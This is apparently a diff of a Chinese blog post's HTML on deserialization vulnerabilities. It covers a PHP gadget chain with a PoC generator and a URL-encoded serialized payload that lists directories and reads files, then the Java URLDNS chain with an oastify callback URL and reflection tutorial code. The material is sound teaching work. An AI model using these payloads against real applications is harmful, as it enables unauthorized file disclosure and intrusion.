-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">You</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:__wakeup</span>()-&gt;<span class="hljs-title class_">Luck</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:__unset</span>()-&gt;<span class="hljs-title class_">Luck</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:__toString-&gt;Flag</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:__invoke</span>()<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">You::__wakeup()-&gt;Luck::__unset()-&gt;Luck::__toString-&gt;Flag::__invoke()<br></code></pre></td></tr></table></figure>
 
 <p>使用GlobIterator原生类构造poc(列出目录)：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Luck</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$l1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$md5</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$new</span> = <span class="hljs-variable language_">$this</span>-&gt;l1;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$new</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;md5)) == <span class="hljs-number">666</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;lll3-&gt;lll3))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;There is noting&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">You</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$y1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;y1-&gt;y1);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$GlobIterator</span> = <span class="hljs-string">&quot;/*&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;May be you can get what you want here&quot;</span>;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function (<span class="hljs-variable">$one</span>, <span class="hljs-variable">$two</span>) &#123;<br>            <span class="hljs-variable">$three</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$two</span>(<span class="hljs-variable">$one</span>);<br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$three</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$tmp</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$tmp</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$flag</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><br><span class="hljs-variable">$luck</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Luck</span>();<br><span class="hljs-variable">$luck</span>-&gt;l1 = <span class="hljs-variable">$flag</span>;<br><br><span class="hljs-variable">$luck1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Luck</span>();<br><span class="hljs-variable">$luck1</span>-&gt;md5 = <span class="hljs-variable">$luck</span>;<br><br><span class="hljs-variable">$you</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">You</span>();<br><span class="hljs-variable">$you</span>-&gt;y1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">You</span>();<br><span class="hljs-variable">$you</span>-&gt;y1-&gt;y1 = <span class="hljs-variable">$luck1</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$you</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>exp：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>You%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>y1%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>You%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>y1%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Luck%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>l1%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>md5%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Luck%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>l1%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Flag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>GlobIterator%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>md5%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">O%3A3%3A%22You%22%3A1%3A%7Bs%3A2%3A%22y1%22%3BO%3A3%3A%22You%22%3A1%3A%7Bs%3A2%3A%22y1%22%3BO%3A4%3A%22Luck%22%3A2%3A%7Bs%3A2%3A%22l1%22%3BN%3Bs%3A3%3A%22md5%22%3BO%3A4%3A%22Luck%22%3A2%3A%7Bs%3A2%3A%22l1%22%3BO%3A4%3A%22Flag%22%3A1%3A%7Bs%3A12%3A%22GlobIterator%22%3Bs%3A2%3A%22%2F%2A%22%3B%7Ds%3A3%3A%22md5%22%3BN%3B%7D%7D%7D%7D<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173755984.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173755984.png"></p>
 <p>再使用SplFileObject原生类读取文件：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173931280.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173915503.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173931280.png"></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173915503.png"></p>
 <h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><h2 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//序列化：</span><br>ObjectOutputStream<br><span class="hljs-comment">//反序列化：</span><br>ObjectInputStream<br></code></pre></td></tr></table></figure>
 
 <p>序列化过程：</p>
@@ -506,50 +159,50 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test.serializetest;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123; name : &#x27;&quot;</span>+name+<span class="hljs-string">&quot;&#x27; ; age : &quot;</span>+age+<span class="hljs-string">&quot; &#125;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>transient关键字修饰的不会被序列化</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231019013247721.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231019013247721.png"></p>
 <p>可能的情况：</p>
 <p>入口类<code>readObject()</code>方法直接调用危险函数(极小概率。实际开发没有人会闲着没事)</p>
 <p>重写<code>readObject()</code>方法，写入危险函数(反序列化靶场1：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231019204338159.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231019204338159.png"></p>
 <p>序列化一个Person对象后将其反序列化，弹窗计算器</p>
 <h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS:"></a>URLDNS:</h2><p>一个很完美的入口类：<code>HashMap</code></p>
 <p>它继承了Serializable接口，用于序列化操作：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021012846629.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021012846629.png"></p>
 <p><code>HashMap</code>类重写了<code>readObject()</code>方法，这是必要的</p>
 <p>我们跟进<code>HashMap</code>类：</p>
 <p>进到<code>HashMap</code>重写的<code>readObject()</code>方法，注意到调用了<code>hash()</code>方法：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021010227415.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021010227415.png"></p>
 <p>跟进到<code>hash()</code>方法内，并在传入的对象不为null时调用<code>hashCode()</code>方法：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021010725181.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021010725181.png"></p>
 <p>跟进hashCode()方法：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021011511542.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021011511542.png"></p>
 <p>直接来到了Object类的hashCode()函数；至此，HashMap类我们需要利用到的链已经梳理清楚了，我们接下来寻找另一个可利用类：URL，URL类是Java的net包中提供的一个用于进行网络请求的类，内置很多的请求方法。</p>
 <p>继承了Serializable接口，nice！</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021012716791.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021012716791.png"></p>
 <p>有个hashCode()方法，这里有个注意点在于黄色框框内的条件，如果hashCode的值不为-1，那么直接返回hashCode值而不执行下面的handler.hashCode()，那我们继续跟进hashCode()</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021014204061.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021014204061.png"></p>
 <p>这里有个getHostAddress()方法：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021014539958.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021014539958.png"></p>
 <p>getHostAddress()-&gt;getByName()，就是获取一个请求域名的ip地址，那就必然会触发dns解析，可以作为黑盒时反序列化存在验证的特征</p>
-<p><img src="/image-20231021014828001.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image-20231021014828001.png"></p>
 <p>在HashMap中的<code>hashCode()</code>方法可以走到URL的<code>hashCode()</code>方法中</p>
 <p>调用如下代码：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    HashMap&lt;URL,Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    hashMap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://9fph4lv8yyoc7whmcdbzs13j8ae32tqi.oastify.com&quot;</span>),<span class="hljs-number">1</span>);<br>    Serialize. Serialize(hashMap);<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>按理来说在序列化过程中并不会调用readObject()方法，不会触发DNS解析，可是实际上却是收到了来自hook的请求：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022155742899.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022155742899.png"></p>
 <p>问题是出在了put()方法上，查看put的代码：</p>
 <p>显而易见，在put()时就已经调用了hash()方法(为确保键的唯一性)：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022160100214.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022160100214.png"></p>
 <p>而hash()方法调用了hashCode()方法，就导致不需要经过反序列化readObject()方法就可以调用URL的hashCode()方法，理解了这个之后我们会发现只需要到put()这一步就可以触发hashCode()了，那必然会对我们URLDNS探测反序列化漏洞造成混淆：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022160209274.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022160209274.png"></p>
 <p>那么对一个已经序列化好的对象反序列化呢？能否触发readObject()方法呢？答案是不行的，在对URL进行分析时我们上面注意到，只有当hashCode值为-1时才执行handler.hashCode()，</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022203901385.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022172803715.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022203901385.png"></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022172803715.png"></p>
 <p>同时类里定义了hashCode初始值为-1</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022173034403.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022173034403.png"></p>
 <p>在反序列化过程中由于我们的hashmap对象put了一个URL-&gt;Integer键值对，在URL::hashCode()方法中，如果hashCode为-1时，是会执行hashCode &#x3D; handler.hashCode(this)语句从而改变hashCode的值，不再为-1</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023182039564.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023182039564.png"></p>
 <p>，所以hashCode值已经不为-1了，</p>
 <p>那么有没有办法可以把已经实例化的对象的值进行操作呢？在put操作完之后将hashCode的值改回-1，答案是有的，那就是反射：</p>
 <h3 id="反射："><a href="#反射：" class="headerlink" title="反射："></a>反射：</h3><h4 id="获取原型以及生成对象-Class-Instance-："><a href="#获取原型以及生成对象-Class-Instance-：" class="headerlink" title="获取原型以及生成对象(Class,Instance)："></a>获取原型以及生成对象(Class,Instance)：</h4><p>Class类：反射就是通过操作Class类，从原型class中实例化对象，修改属性等等：</p>
@@ -560,7 +213,7 @@
 <p>通过Class类下的getClass()方法来获取person对象的类的原型c；</p>
 <p>此时如果像注释中直接调用newInstance()方法，那么默认是通过无参构造函数实例化对象的，但是显然，我们的Person类下的构造函数是有参的，这时就要使用Constructor类下的getConstructor()方法来构造有参实例了</p>
 <p>查看getConstructor()方法的源码，参数是类泛型</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022221215908.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022221215908.png"></p>
 <p>然后将constructor对象调用newInstance()方法，来生成一个实例（返回Object对象），此时可以直接在newInstance()方法中传参。</p>
 <p>或者：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Person&quot;</span>);<br></code></pre></td></tr></table></figure>
@@ -578,12 +231,12 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> c.getField(<span class="hljs-string">&quot;age&quot;</span>);<br>System.out.println(f);<br></code></pre></td></tr></table></figure>
 
 <p>就会抛出异常信息：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023131127298.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023131127298.png"></p>
 <p>但是使用</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>System.out.println(f);<br></code></pre></td></tr></table></figure>
 
 <p>输出</p>
-<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> com.test.serializetest.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Person</span>.</span></span>age<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">private int com.test.serializetest.Person.age<br></code></pre></td></tr></table></figure>
 
 <h5 id="获取对象属性值："><a href="#获取对象属性值：" class="headerlink" title="获取对象属性值："></a>获取对象属性值：</h5><p><code>Field.getName()</code>：获取<strong>Field类型</strong>对象的属性名，返回字符串类型对象</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Field[] fields = c.getDeclaredFields();<br><span class="hljs-keyword">for</span> (Field field: fields)&#123;<br>    System.out.println(field.getName());<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">name</span><br><span class="hljs-comment">age</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure>
@@ -600,7 +253,7 @@
 <p>但是在修改私有属性age的值的时候会发现抛出了异常：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>System.out.println(f.get(p));<br>f.set(p,<span class="hljs-number">20</span>);<br>System.out.println(f.get(p));<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023133557862.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023133557862.png"></p>
 <p>原因是无法修改私有属性的值(实操get()也不行，即无法获取私有属性的值)，但是反射赋予了我们极大的权限，可以修改属性的修饰符：</p>
 <p><code>setAccessible(boolen)：</code></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>f.setAccessible(<span class="hljs-literal">true</span>);<br>System.out.println(f.get(p));<br>f.set(p,<span class="hljs-number">20</span>);<br>System.out.println(f.get(p));<br></code></pre></td></tr></table></figure>
@@ -615,34 +268,34 @@
 
 <p><code>getDeclaredMethod()</code>方法从类原型中获取名为toString的类方法，返回一个Method类型的对象</p>
 <p>Method对象的<code>invoke()</code>方法，是调用对象p中的<code>toString()</code>方法，即打印出个人信息，结果如下：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023185409822.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023185409822.png"></p>
 <p>但是如果是有参的方法的情况呢？</p>
 <p>我们在Person类里新定义一个<code>eat()</code>方法：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023201319727.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023201319727.png"></p>
 <p>如此调用：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;eating&quot;</span>);<br>method.invoke(p,<span class="hljs-string">&quot;apple&quot;</span>);<br></code></pre></td></tr></table></figure>
 
 <p>便出现了异常：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023201830216.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023201830216.png"></p>
 <p>实际上与构造器类Constructor类似的，我们在获取有参方法时要传入参数：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023202220648.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023202220648.png"></p>
 <p>修改为：</p>
